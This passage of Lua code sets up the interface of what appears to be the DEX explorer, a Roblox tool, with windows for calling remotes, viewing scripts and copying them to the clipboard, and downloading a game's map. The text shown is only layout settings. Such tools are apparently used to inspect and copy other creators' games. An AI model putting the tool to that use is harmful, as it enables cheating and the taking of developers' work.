NewGuiPart57.Parent = NewGuiPart56
NewGuiPart57.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart57.BackgroundTransparency = 1
NewGuiPart57.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart57.Size = UDim2.new(1, 0, 0, 42)
NewGuiPart57.ZIndex = 4
NewGuiPart57.Font = Enum.Font.SourceSans
NewGuiPart57.FontSize = Enum.FontSize.Size14
NewGuiPart57.Text = "The file, FILENAME, already exists. Overwrite?"
NewGuiPart57.TextWrapped = true

NewGuiPart58.Name = "Ok"
NewGuiPart58.Parent = NewGuiPart56
NewGuiPart58.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart58.BackgroundTransparency = 0.5
NewGuiPart58.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart58.Position = UDim2.new(0.300000012, 0, 1, -40)
NewGuiPart58.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart58.ZIndex = 4
NewGuiPart58.Font = Enum.Font.SourceSans
NewGuiPart58.FontSize = Enum.FontSize.Size18
NewGuiPart58.Text = "Ok"

NewGuiPart59.Name = "CallRemote"
NewGuiPart59.Parent = NewGuiPart1
NewGuiPart59.Active = true
NewGuiPart59.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart59.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart59.Draggable = true
NewGuiPart59.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart59.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart59.Visible = false
NewGuiPart59.ZIndex = 2

NewGuiPart60.Name = "Title"
NewGuiPart60.Parent = NewGuiPart59
NewGuiPart60.BackgroundTransparency = 1
NewGuiPart60.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart60.ZIndex = 2
NewGuiPart60.Font = Enum.Font.SourceSans
NewGuiPart60.FontSize = Enum.FontSize.Size14
NewGuiPart60.Text = "Call Remote"
NewGuiPart60.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart60.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart61.Name = "MainWindow"
NewGuiPart61.Parent = NewGuiPart59
NewGuiPart61.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart61.BackgroundTransparency = 0.10000000149012
NewGuiPart61.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart61.Size = UDim2.new(1, 0, 0, 200)

NewGuiPart62.Name = "Desc"
NewGuiPart62.Parent = NewGuiPart61
NewGuiPart62.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart62.BackgroundTransparency = 1
NewGuiPart62.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart62.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart62.Font = Enum.Font.SourceSans
NewGuiPart62.FontSize = Enum.FontSize.Size14
NewGuiPart62.Text = "Arguments"
NewGuiPart62.TextWrapped = true

NewGuiPart63.Name = "Arguments"
NewGuiPart63.Parent = NewGuiPart61
NewGuiPart63.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart63.BackgroundTransparency = 1
NewGuiPart63.Position = UDim2.new(0, 0, 0, 40)
NewGuiPart63.Size = UDim2.new(1, 0, 0, 80)
NewGuiPart63.BottomImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart63.CanvasSize = UDim2.new(0, 0, 0, 0)
NewGuiPart63.MidImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart63.TopImage = "rbxasset://textures/blackBkg_square.png"

NewGuiPart64.Name = "DisplayReturned"
NewGuiPart64.Parent = NewGuiPart61
NewGuiPart64.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart64.BackgroundTransparency = 0.60000002384186
NewGuiPart64.Position = UDim2.new(0.075000003, 0, 0.625, 0)
NewGuiPart64.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart64.ZIndex = 2
NewGuiPart64.Font = Enum.Font.SourceSans
NewGuiPart64.FontSize = Enum.FontSize.Size18
NewGuiPart64.Text = ""
NewGuiPart64.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart65.Name = "enabled"
NewGuiPart65.Parent = NewGuiPart64
NewGuiPart65.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart65.BackgroundTransparency = 0.40000000596046
NewGuiPart65.BorderSizePixel = 0
NewGuiPart65.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart65.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart65.Visible = false
NewGuiPart65.Font = Enum.Font.SourceSans
NewGuiPart65.FontSize = Enum.FontSize.Size14
NewGuiPart65.Text = ""

NewGuiPart66.Name = "Desc2"
NewGuiPart66.Parent = NewGuiPart61
NewGuiPart66.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart66.BackgroundTransparency = 1
NewGuiPart66.Position = UDim2.new(0.075000003, 30, 0.625, 0)
NewGuiPart66.Size = UDim2.new(0.925000012, -30, 0, 20)
NewGuiPart66.Font = Enum.Font.SourceSans
NewGuiPart66.FontSize = Enum.FontSize.Size14
NewGuiPart66.Text = "Display values returned"
NewGuiPart66.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart67.Name = "Add"
NewGuiPart67.Parent = NewGuiPart61
NewGuiPart67.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart67.BackgroundTransparency = 0.5
NewGuiPart67.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart67.Position = UDim2.new(0.800000012, 0, 0.625, 0)
NewGuiPart67.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart67.Font = Enum.Font.SourceSansBold
NewGuiPart67.FontSize = Enum.FontSize.Size24
NewGuiPart67.Text = "+"

NewGuiPart68.Name = "Subtract"
NewGuiPart68.Parent = NewGuiPart61
NewGuiPart68.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart68.BackgroundTransparency = 0.5
NewGuiPart68.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart68.Position = UDim2.new(0.899999976, 0, 0.625, 0)
NewGuiPart68.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart68.Font = Enum.Font.SourceSansBold
NewGuiPart68.FontSize = Enum.FontSize.Size24
NewGuiPart68.Text = "-"

NewGuiPart69.Name = "ArgumentTemplate"
NewGuiPart69.Parent = NewGuiPart61
NewGuiPart69.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart69.BackgroundTransparency = 0.5
NewGuiPart69.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart69.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart69.Visible = false

NewGuiPart70.Name = "Type"
NewGuiPart70.Parent = NewGuiPart69
NewGuiPart70.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart70.BackgroundTransparency = 0.89999997615814
NewGuiPart70.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart70.Size = UDim2.new(0.400000006, 0, 0, 20)
NewGuiPart70.Font = Enum.Font.SourceSans
NewGuiPart70.FontSize = Enum.FontSize.Size18
NewGuiPart70.Text = "Script"

NewGuiPart71.Name = "Value"
NewGuiPart71.Parent = NewGuiPart69
NewGuiPart71.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart71.BackgroundTransparency = 0.89999997615814
NewGuiPart71.Position = UDim2.new(0.400000006, 0, 0, 0)
NewGuiPart71.Size = UDim2.new(0.600000024, -12, 0, 20)
NewGuiPart71.Font = Enum.Font.SourceSans
NewGuiPart71.FontSize = Enum.FontSize.Size14
NewGuiPart71.Text = ""
NewGuiPart71.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart72.Name = "Cancel"
NewGuiPart72.Parent = NewGuiPart61
NewGuiPart72.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart72.BackgroundTransparency = 0.5
NewGuiPart72.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart72.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart72.Font = Enum.Font.SourceSans
NewGuiPart72.FontSize = Enum.FontSize.Size18
NewGuiPart72.Text = "Cancel"

NewGuiPart73.Name = "Ok"
NewGuiPart73.Parent = NewGuiPart61
NewGuiPart73.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart73.BackgroundTransparency = 0.5
NewGuiPart73.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart73.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart73.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart73.Font = Enum.Font.SourceSans
NewGuiPart73.FontSize = Enum.FontSize.Size18
NewGuiPart73.Text = "Call"

NewGuiPart74.Name = "TableCaution"
NewGuiPart74.Parent = NewGuiPart1
NewGuiPart74.Active = true
NewGuiPart74.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart74.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart74.Draggable = true
NewGuiPart74.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart74.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart74.Visible = false
NewGuiPart74.ZIndex = 2

NewGuiPart75.Name = "MainWindow"
NewGuiPart75.Parent = NewGuiPart74
NewGuiPart75.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart75.BackgroundTransparency = 0.10000000149012
NewGuiPart75.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart75.Size = UDim2.new(1, 0, 0, 150)

NewGuiPart76.Name = "Ok"
NewGuiPart76.Parent = NewGuiPart75
NewGuiPart76.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart76.BackgroundTransparency = 0.5
NewGuiPart76.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart76.Position = UDim2.new(0.300000012, 0, 1, -40)
NewGuiPart76.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart76.Font = Enum.Font.SourceSans
NewGuiPart76.FontSize = Enum.FontSize.Size18
NewGuiPart76.Text = "Ok"

NewGuiPart77.Name = "TableResults"
NewGuiPart77.Parent = NewGuiPart75
NewGuiPart77.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart77.BackgroundTransparency = 1
NewGuiPart77.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart77.Size = UDim2.new(1, 0, 0, 80)
NewGuiPart77.BottomImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart77.CanvasSize = UDim2.new(0, 0, 0, 0)
NewGuiPart77.MidImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart77.TopImage = "rbxasset://textures/blackBkg_square.png"

NewGuiPart78.Name = "TableTemplate"
NewGuiPart78.Parent = NewGuiPart75
NewGuiPart78.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart78.BackgroundTransparency = 0.5
NewGuiPart78.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart78.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart78.Visible = false

NewGuiPart79.Name = "Type"
NewGuiPart79.Parent = NewGuiPart78
NewGuiPart79.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart79.BackgroundTransparency = 0.89999997615814
NewGuiPart79.Size = UDim2.new(0.400000006, 0, 0, 20)
NewGuiPart79.Font = Enum.Font.SourceSans
NewGuiPart79.FontSize = Enum.FontSize.Size18
NewGuiPart79.Text = "Script"

NewGuiPart80.Name = "Value"
NewGuiPart80.Parent = NewGuiPart78
NewGuiPart80.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart80.BackgroundTransparency = 0.89999997615814
NewGuiPart80.Position = UDim2.new(0.400000006, 0, 0, 0)
NewGuiPart80.Size = UDim2.new(0.600000024, -12, 0, 20)
NewGuiPart80.Font = Enum.Font.SourceSans
NewGuiPart80.FontSize = Enum.FontSize.Size14
NewGuiPart80.Text = "Script"

NewGuiPart81.Name = "Title"
NewGuiPart81.Parent = NewGuiPart74
NewGuiPart81.BackgroundTransparency = 1
NewGuiPart81.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart81.ZIndex = 2
NewGuiPart81.Font = Enum.Font.SourceSans
NewGuiPart81.FontSize = Enum.FontSize.Size14
NewGuiPart81.Text = "Caution"
NewGuiPart81.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart81.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart82.Name = "ScriptEditor"
NewGuiPart82.Parent = NewGuiPart1
NewGuiPart82.Active = true
NewGuiPart82.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart82.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart82.Draggable = true
NewGuiPart82.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart82.Size = UDim2.new(0, 516, 0, 20)
NewGuiPart82.Visible = false
NewGuiPart82.ZIndex = 5

NewGuiPart163.Name = "OpenScript"
NewGuiPart163.Parent = NewGuiPart82
NewGuiPart163.Archivable = true

NewGuiPart83.Name = "Title"
NewGuiPart83.Parent = NewGuiPart82
NewGuiPart83.BackgroundTransparency = 1
NewGuiPart83.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart83.ZIndex = 5
NewGuiPart83.Font = Enum.Font.SourceSans
NewGuiPart83.FontSize = Enum.FontSize.Size14
NewGuiPart83.Text = "Script Viewer"
NewGuiPart83.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart83.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart84.Name = "Cover"
NewGuiPart84.Parent = NewGuiPart82
NewGuiPart84.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart84.BorderSizePixel = 0
NewGuiPart84.Position = UDim2.new(0, 0, 3, 0)
NewGuiPart84.Size = UDim2.new(0, 516, 0, 416)

NewGuiPart85.Name = "EditorGrid"
NewGuiPart85.Parent = NewGuiPart82
NewGuiPart85.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart85.BorderSizePixel = 0
NewGuiPart85.Position = UDim2.new(0, 0, 3, 0)
NewGuiPart85.Size = UDim2.new(0, 500, 0, 400)

NewGuiPart86.Name = "TopBar"
NewGuiPart86.Parent = NewGuiPart82
NewGuiPart86.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart86.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart86.Size = UDim2.new(1, 0, 3, 0)

NewGuiPart87.Name = "ScriptBarLeft"
NewGuiPart87.Parent = NewGuiPart86
NewGuiPart87.Active = false
NewGuiPart87.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
NewGuiPart87.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart87.Position = UDim2.new(1, -32, 0, 40)
NewGuiPart87.Size = UDim2.new(0, 16, 0, 20)
NewGuiPart87.AutoButtonColor = false

NewGuiPart88.Name = "Arrow Graphic"
NewGuiPart88.Parent = NewGuiPart87
NewGuiPart88.BackgroundTransparency = 1
NewGuiPart88.BorderSizePixel = 0
NewGuiPart88.Position = UDim2.new(0.5, -4, 0.5, -4)
NewGuiPart88.Size = UDim2.new(0, 8, 0, 8)

NewGuiPart89.Name = "Graphic"
NewGuiPart89.Parent = NewGuiPart88
NewGuiPart89.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart89.BackgroundTransparency = 0.69999998807907
NewGuiPart89.BorderSizePixel = 0
NewGuiPart89.Position = UDim2.new(0.25, 0, 0.375, 0)
NewGuiPart89.Size = UDim2.new(0.125, 0, 0.25, 0)

NewGuiPart90.Name = "Graphic"
NewGuiPart90.Parent = NewGuiPart88
NewGuiPart90.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart90.BackgroundTransparency = 0.69999998807907
NewGuiPart90.BorderSizePixel = 0
NewGuiPart90.Position = UDim2.new(0.375, 0, 0.25, 0)
NewGuiPart90.Size = UDim2.new(0.125, 0, 0.5, 0)

NewGuiPart91.Name = "Graphic"
NewGuiPart91.Parent = NewGuiPart88
NewGuiPart91.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart91.BackgroundTransparency = 0.69999998807907
NewGuiPart91.BorderSizePixel = 0
NewGuiPart91.Position = UDim2.new(0.5, 0, 0.125, 0)
NewGuiPart91.Size = UDim2.new(0.125, 0, 0.75, 0)

NewGuiPart92.Name = "Graphic"
NewGuiPart92.Parent = NewGuiPart88
NewGuiPart92.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart92.BackgroundTransparency = 0.69999998807907
NewGuiPart92.BorderSizePixel = 0
NewGuiPart92.Position = UDim2.new(0.625, 0, 0, 0)
NewGuiPart92.Size = UDim2.new(0.125, 0, 1, 0)

NewGuiPart93.Name = "ScriptBarRight"
NewGuiPart93.Parent = NewGuiPart86
NewGuiPart93.Active = false
NewGuiPart93.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
NewGuiPart93.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart93.Position = UDim2.new(1, -16, 0, 40)
NewGuiPart93.Size = UDim2.new(0, 16, 0, 20)
NewGuiPart93.AutoButtonColor = false

NewGuiPart94.Name = "Arrow Graphic"
NewGuiPart94.Parent = NewGuiPart93
NewGuiPart94.BackgroundTransparency = 1
NewGuiPart94.BorderSizePixel = 0
NewGuiPart94.Position = UDim2.new(0.5, -4, 0.5, -4)
NewGuiPart94.Size = UDim2.new(0, 8, 0, 8)

NewGuiPart95.Name = "Graphic"
NewGuiPart95.Parent = NewGuiPart94
NewGuiPart95.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart95.BackgroundTransparency = 0.69999998807907
NewGuiPart95.BorderSizePixel = 0
NewGuiPart95.Position = UDim2.new(0.625, 0, 0.375, 0)
NewGuiPart95.Size = UDim2.new(0.125, 0, 0.25, 0)

NewGuiPart96.Name = "Graphic"
NewGuiPart96.Parent = NewGuiPart94
NewGuiPart96.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart96.BackgroundTransparency = 0.69999998807907
NewGuiPart96.BorderSizePixel = 0
NewGuiPart96.Position = UDim2.new(0.5, 0, 0.25, 0)
NewGuiPart96.Size = UDim2.new(0.125, 0, 0.5, 0)

NewGuiPart97.Name = "Graphic"
NewGuiPart97.Parent = NewGuiPart94
NewGuiPart97.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart97.BackgroundTransparency = 0.69999998807907
NewGuiPart97.BorderSizePixel = 0
NewGuiPart97.Position = UDim2.new(0.375, 0, 0.125, 0)
NewGuiPart97.Size = UDim2.new(0.125, 0, 0.75, 0)

NewGuiPart98.Name = "Graphic"
NewGuiPart98.Parent = NewGuiPart94
NewGuiPart98.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart98.BackgroundTransparency = 0.69999998807907
NewGuiPart98.BorderSizePixel = 0
NewGuiPart98.Position = UDim2.new(0.25, 0, 0, 0)
NewGuiPart98.Size = UDim2.new(0.125, 0, 1, 0)

NewGuiPart99.Name = "Clipboard"
NewGuiPart99.Parent = NewGuiPart86
NewGuiPart99.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart99.BackgroundTransparency = 0.5
NewGuiPart99.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart99.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart99.Size = UDim2.new(0, 80, 0, 20)
NewGuiPart99.Font = Enum.Font.SourceSans
NewGuiPart99.FontSize = Enum.FontSize.Size14
NewGuiPart99.Text = "To Clipboard"

NewGuiPart100.Name = "ScriptBar"
NewGuiPart100.Parent = NewGuiPart86
NewGuiPart100.BackgroundColor3 = Color3.new(0.823529, 0.823529, 0.823529)
NewGuiPart100.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart100.ClipsDescendants = true
NewGuiPart100.Position = UDim2.new(0, 0, 0, 40)
NewGuiPart100.Size = UDim2.new(1, -32, 0, 20)

NewGuiPart101.Name = "Entry"
NewGuiPart101.Parent = NewGuiPart86
NewGuiPart101.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart101.BackgroundTransparency = 1
NewGuiPart101.Size = UDim2.new(0, 100, 1, 0)
NewGuiPart101.Visible = false

NewGuiPart102.Name = "Button"
NewGuiPart102.Parent = NewGuiPart101
NewGuiPart102.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart102.BackgroundTransparency = 0.60000002384186
NewGuiPart102.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart102.ClipsDescendants = true
NewGuiPart102.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart102.ZIndex = 4
NewGuiPart102.Font = Enum.Font.SourceSans
NewGuiPart102.FontSize = Enum.FontSize.Size12
NewGuiPart102.Text = ""
NewGuiPart102.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart103.Name = "Close"
NewGuiPart103.Parent = NewGuiPart101
NewGuiPart103.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart103.BackgroundTransparency = 1
NewGuiPart103.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart103.Position = UDim2.new(1, -20, 0, 0)
NewGuiPart103.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart103.ZIndex = 4
NewGuiPart103.Font = Enum.Font.SourceSans
NewGuiPart103.FontSize = Enum.FontSize.Size14
NewGuiPart103.Text = "X"

NewGuiPart104.Name = "Close"
NewGuiPart104.Parent = NewGuiPart82
NewGuiPart104.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart104.BackgroundTransparency = 1
NewGuiPart104.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart104.Position = UDim2.new(1, -20, 0, 0)
NewGuiPart104.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart104.ZIndex = 5
NewGuiPart104.Font = Enum.Font.SourceSans
NewGuiPart104.FontSize = Enum.FontSize.Size14
NewGuiPart104.Text = "X"

NewGuiPart105.Name = "IntroFrame"
NewGuiPart105.Parent = NewGuiPart1
NewGuiPart105.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
NewGuiPart105.BorderSizePixel = 0
NewGuiPart105.Position = UDim2.new(1, 30, 0, 0)
NewGuiPart105.Size = UDim2.new(0, 300, 1, 0)
NewGuiPart105.ZIndex = 2

NewGuiPart106.Name = "Main"
NewGuiPart106.Parent = NewGuiPart105
NewGuiPart106.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
NewGuiPart106.BorderSizePixel = 0
NewGuiPart106.Position = UDim2.new(0, -30, 0, 0)
NewGuiPart106.Size = UDim2.new(0, 30, 0, 90)
NewGuiPart106.ZIndex = 2

NewGuiPart107.Name = "Title"
NewGuiPart107.Parent = NewGuiPart105
NewGuiPart107.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart107.BackgroundTransparency = 1
NewGuiPart107.Position = UDim2.new(0, 100, 0, 150)
NewGuiPart107.Size = UDim2.new(0, 100, 0, 60)
NewGuiPart107.ZIndex = 2
NewGuiPart107.Font = Enum.Font.SourceSansBold
NewGuiPart107.FontSize = Enum.FontSize.Size60
NewGuiPart107.Text = "DEX"
NewGuiPart107.TextWrapped = true

NewGuiPart108.Name = "Version"
NewGuiPart108.Parent = NewGuiPart105
NewGuiPart108.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart108.BackgroundTransparency = 1
NewGuiPart108.Position = UDim2.new(0, 100, 0, 210)
NewGuiPart108.Size = UDim2.new(0, 100, 0, 30)
NewGuiPart108.ZIndex = 2
NewGuiPart108.Font = Enum.Font.SourceSansBold
NewGuiPart108.FontSize = Enum.FontSize.Size28
NewGuiPart108.Text = "V2.0.0"
NewGuiPart108.TextWrapped = true

NewGuiPart109.Name = "Creator"
NewGuiPart109.Parent = NewGuiPart105
NewGuiPart109.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart109.BackgroundTransparency = 1
NewGuiPart109.Position = UDim2.new(0, 80, 0, 300)
NewGuiPart109.Size = UDim2.new(0, 140, 0, 30)
NewGuiPart109.ZIndex = 2
NewGuiPart109.Font = Enum.Font.SourceSansBold
NewGuiPart109.FontSize = Enum.FontSize.Size28
NewGuiPart109.Text = "Raspberry Pi , Script Made By Advancedev"
NewGuiPart109.TextWrapped = true

NewGuiPart110.Name = "Slant"
NewGuiPart110.Parent = NewGuiPart105
NewGuiPart110.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart110.BackgroundTransparency = 1
NewGuiPart110.Position = UDim2.new(0, -30, 0, 90)
NewGuiPart110.Rotation = 180
NewGuiPart110.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart110.ZIndex = 2
NewGuiPart110.Image = "rbxassetid://474172996"
NewGuiPart110.ImageColor3 = Color3.new(0.960784, 0.960784, 0.960784)

NewGuiPart111.Name = "SaveMapWindow"
NewGuiPart111.Parent = NewGuiPart1
NewGuiPart111.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart111.BackgroundTransparency = 0.10000000149012
NewGuiPart111.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart111.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart111.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart112.Name = "Header"
NewGuiPart112.Parent = NewGuiPart111
NewGuiPart112.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart112.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart112.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart113.Parent = NewGuiPart112
NewGuiPart113.BackgroundTransparency = 1
NewGuiPart113.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart113.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart113.Font = Enum.Font.SourceSans
NewGuiPart113.FontSize = Enum.FontSize.Size14
NewGuiPart113.Text = "Map Downloader"
NewGuiPart113.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart113.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart114.Name = "MapSettings"
NewGuiPart114.Parent = NewGuiPart111
NewGuiPart114.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart114.BackgroundTransparency = 1
NewGuiPart114.Position = UDim2.new(0, 0, 0, 200)
NewGuiPart114.Size = UDim2.new(1, 0, 0, 240)

NewGuiPart115.Name = "Terrain"
NewGuiPart115.Parent = NewGuiPart114
NewGuiPart115.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart115.BackgroundTransparency = 1
NewGuiPart115.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart115.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart116.Name = "SName"
NewGuiPart116.Parent = NewGuiPart115
NewGuiPart116.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart116.BackgroundTransparency = 1
NewGuiPart116.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart116.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart116.Font = Enum.Font.SourceSans
NewGuiPart116.FontSize = Enum.FontSize.Size18
NewGuiPart116.Text = "Save Terrain"
NewGuiPart116.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart117.Name = "Status"
NewGuiPart117.Parent = NewGuiPart115
NewGuiPart117.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart117.BackgroundTransparency = 1
NewGuiPart117.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart117.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart117.Font = Enum.Font.SourceSans
NewGuiPart117.FontSize = Enum.FontSize.Size18
NewGuiPart117.Text = "Off"
NewGuiPart117.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart118.Name = "Change"
NewGuiPart118.Parent = NewGuiPart115
NewGuiPart118.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart118.BorderSizePixel = 0
NewGuiPart118.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart118.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart118.Font = Enum.Font.SourceSans
NewGuiPart118.FontSize = Enum.FontSize.Size14
NewGuiPart118.Text = ""

NewGuiPart119.Name = "OnBar"
NewGuiPart119.Parent = NewGuiPart118
NewGuiPart119.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart119.BorderSizePixel = 0
NewGuiPart119.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart119.Font = Enum.Font.SourceSans
NewGuiPart119.FontSize = Enum.FontSize.Size14
NewGuiPart119.Text = ""

NewGuiPart120.Name = "Bar"
NewGuiPart120.Parent = NewGuiPart118
NewGuiPart120.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart120.BorderSizePixel = 0
NewGuiPart120.ClipsDescendants = true
NewGuiPart120.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart120.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart120.Font = Enum.Font.SourceSans
NewGuiPart120.FontSize = Enum.FontSize.Size14
NewGuiPart120.Text = ""

NewGuiPart121.Name = "Lighting"
NewGuiPart121.Parent = NewGuiPart114
NewGuiPart121.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart121.BackgroundTransparency = 1
NewGuiPart121.Position = UDim2.new(0, 0, 0, 120)
NewGuiPart121.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart122.Name = "SName"
NewGuiPart122.Parent = NewGuiPart121
NewGuiPart122.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart122.BackgroundTransparency = 1
NewGuiPart122.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart122.Size = UDim2.new(1, -20, 0, 30)
